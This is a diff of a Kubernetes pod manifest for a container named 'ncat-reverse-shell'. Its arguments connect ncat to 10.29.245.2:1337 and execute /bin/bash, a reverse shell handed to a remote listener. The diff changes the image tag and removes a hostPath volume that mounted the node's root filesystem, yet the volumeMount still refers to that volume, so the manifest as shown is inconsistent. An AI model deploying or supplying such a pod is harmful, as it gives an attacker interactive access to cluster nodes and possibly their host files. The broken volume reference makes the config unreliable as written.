@@ -14,7 +14,7 @@ spec:
     spec:
       containers:
       - name: ncat-reverse-shell
-        image: raesene/ncat:latest
+        image: raesene/ncat:v1
         resources:
           limits:
             cpu: 1000m
@@ -23,9 +23,5 @@ spec:
         - mountPath: /host
           name: hostvolume
         args: ['10.29.245.2', '1337', '-e', '/bin/bash']
-      volumes:
-        - name: hostvolume
-          hostPath:
-            path: /
-            type: Directory
+      
       
